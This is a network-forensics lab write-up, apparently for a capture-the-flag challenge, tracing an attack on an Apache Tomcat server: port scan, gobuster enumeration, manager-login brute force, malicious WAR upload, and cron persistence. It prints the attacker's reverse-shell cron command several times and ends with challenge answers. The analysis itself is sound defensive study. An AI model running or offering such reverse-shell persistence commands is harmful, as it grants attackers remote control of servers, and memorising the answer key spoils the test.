# Scenario & Objective

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

- **Category**: Network Forensics
- **Tools**: Wireshark, IP Location
## Overview
(Conclude your report with a summary of the main finding of you analysis --> 5 Ws: Who, What, When, Where, Why)

The system recorded that at about `01:18 - 01:24` in `09-11-2023`, the attacker `14.0.0.120` from `Guangdong - China` attack the `Tomcat` web server `10.0.0.120` by process scan, brute-force, upload malicious and persistent attack. 

For more detail, the attacker used tool for scaning port on the server and he chooes port `8080` for attacking. Then he used `gobuster` to scan hidden assets and found admin page of web server. Then he brute-forced the admin page and found the credential `admin:tomcat`. After accessing, attacker deploy a malicious file `JXQOZY.war` - a type of compressed file that Apache Tomcat server can run it automatically into a web application. This web application connects to attacker and helps them execute command in shell in the web server. Attacker add a  schedule backdoor `bash -i >& /dev/tcp/14.0.0.120/443 0>&1` that connect back to the attacker machine through port `443` every 60s.
# Analysis

I were provided a `web server.pcap` that contain `21 070` packets from `01:13:06` to `01:27:37` in `2023-09-11`. And the file has SH256 value:
`9a8dbb2ec468166ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716`.

Moreoever, the file contains `7` IP addresses.
<p align="center">
  <img src="./Assets/Image 1 - All IP addresses.webp" alt="All IP addresses" /> <br />
  <em>Image 1: All IP addresses</em>
</p>

At first, from the session setup phase of SMB2 protocol - packet 10, at `01:13:06`, I find that host `10.0.0.115` accessed `10.0.0.105`, host name is `CYBERDEFENDERS-VIRTUAL-MACHINE` under `root` account.
<p align="center">
  <img src="./Assets/Image 2 - Information of host 115 and 105.webp" alt="Information of host 115 and 105" /> <br />
  <em>Image 2: Information of host 115 and 105</em>
</p>

Then, host `10.0.0.105` continue to access `IPC$` and `shared` folder in server `10.0.0.115`. At `01:13:12` (packet 31), host `10.0.0.115` find 3 files `pdf` in `shared` folder on server `10.0.0.105`.
<p align="center">
  <img src="./Assets/Image 3 - 3 files pdf in server.webp" alt="3 files pdf in server" /> <br />
  <em>Image 3: 3 files pdf in server</em>
</p>

Then, I go to `File > Export Objects > SMB` and know the host `10.0.0.115` request to read 2 files below. 

At `01:13:18` (packet 72), host `115` read file `work_report2023.pdf` (MD5 hash value: `7CDCF5EAF3E59F0838DD8882098C1588`). 

And at `01:13:27` (packet 124), host `115` read the file `work_report2022.pdf` (MD5 hash value: `4D3652491916845EDC8FF05EC04E089D`). 

However, I can open it due to format error.
<p align="center">
  <img src="./Assets/Image 4.1 - 115 read 2 files.webp" alt="115 read 2 files" /> <br />
  <img src="./Assets/Image 4.2 - Cannot open files due to format error.webp" alt="Cannot open files due to format error" /> <br />
  <em>Image 4: 2 pdf files that host 115 read</em>
</p>

Then, at around `01:13` the host `10.0.0.115` connected with `10.0.0.112` via SSHv2 protocol. And I can find some information like the protocol verion `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3` and the algorithm that they use to encrypt the message is the combination of  `chacha20` and `poly1305-AES`.
<p align="center">
  <img src="./Assets/Image 5.1 - Encrypted algorithm.webp" alt="Encrypted algorithm" /> <br />
  <img src="./Assets/Image 5.2 - Web server.webp" alt="Web server" /> <br />
  <em>Image 5: Host 115 connect with web server</em>
</p>

Moreover, host `10.0.0.115` still accessed website in `10.0.0.112` through port `8080`. And from that, I know the host `10.0.0.112` run `Apache Tomcat` web server.

Next, at about `01:18` (packet 1091), I see many request come from host `14.0.0.120` to web server. The special thing here is that the host `14.0.0.120` did not just send so many requets, it also requested to multiple port. Moreoever, host `14.0.0.120` just sent TCP `[SYN]` packet and did not replay `[ACK]` event when the services on the port response. It is exactly the `TCP SYN` scan action.
<p align="center">
  <img src="./Assets/Image 6.1 - TCP SYN scan request.webp" alt="TCP SYN scan request" /> <br />
<img src="./Assets/Image 6.2 - IP location.webp" alt="IP location" /> <br />
  <em>Image 6: Attacker scan port </em>
</p>

And I also know the attacker come from `Guangdong - China`.

After scanning, at `01:19` (packet 19948) suspicious host connected with the web server through port `8080`, then used `gobuster` to  scan all hidden assets on web server.
<p align="center">
  <img src="./Assets/Image 7 - Gobuster scan hidden assets.webp" alt="Gobuster scan hidden assets" /> <br />
  <em>Image 7: Gobuster scan hidden assets </em>
</p>

After that, at about `01:22`, the attacker brute-forced the admin page `/manager/html/upload` and uploaded a suspicious file called `JXQOZY.war` through credentials `admin:tomcat`.
<p align="center">
  <img src="./Assets/Image 8 - Attacker post malicious file into web server.webp" alt="Attacker post malicious file into web server" /> <br />
  <em>Image 8: Attacker post malicious file into web server </em>
</p>

This is a web application archive, a type of compressed file. When it is deployed into Apache Tomcat server, it will be extracted and executed automatically into a web app that can be accessed. That is why I cannot see the content of the file.
<p align="center">
  <img src="./Assets/Image 9 - Cannot see the content of JXQOZY file.webp" alt="Cannot see the content of JXQOZY file" /> <br />
  <em>Image 9: File JXQOZY.war</em>
</p>

Then at  about `01:22 - 01:24`, in the packet 20651, 20653, 20657, ..., attacker push some thing into web server through malicious file `JXQOZY.war`. I want to know exectly what is it, so I go to `File > Export Objects > HTTP`.
<p align="center">
  <img src="./Assets/Image 10 - Attacker command.webp" alt="Attacker command" /> <br />
  <em>Image 10: Attacker command</em>
</p>

After downloading and opening these files, here is all the command that the attacker run in the web server.
```powershell
# packet 20651 & 20653
whoami -> root

# packet 20657
cd /tmp

# packet 20659 & 20661
pwd -> /tmp

# packet 20666
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron

# packet 20676 
crontab -i cron

# packet 20682 & 20684
crontab -l -> * * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

So, every 60 seconds, the server automatically executes this cron job, connect to the attacket host through port `443`.  

After attack phase by `14.0.0.120`, the host `10.0.0.115` connected agains to web server. It seems like this is the admin that comeback to check the server after an alert of suspicious activity.
<p align="center">
  <img src="./Assets/Image 11 - Admin check the server.webp" alt="Admin check the server" /> <br />
  <em>Image 11: Admin check the server</em>
</p>
# Answer the Questions

**Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?**

It is `14.0.0.120`.

**Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?**

It is `China`.

**Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?**

It is `8080`.

**Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?**

It is `Gobuster`.

**Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?**

It is `/manager`.

**Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?**

It is `admin:tomcat`.

**Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?**

It is `JXQOZY.war`.

**Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?**

It is `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`.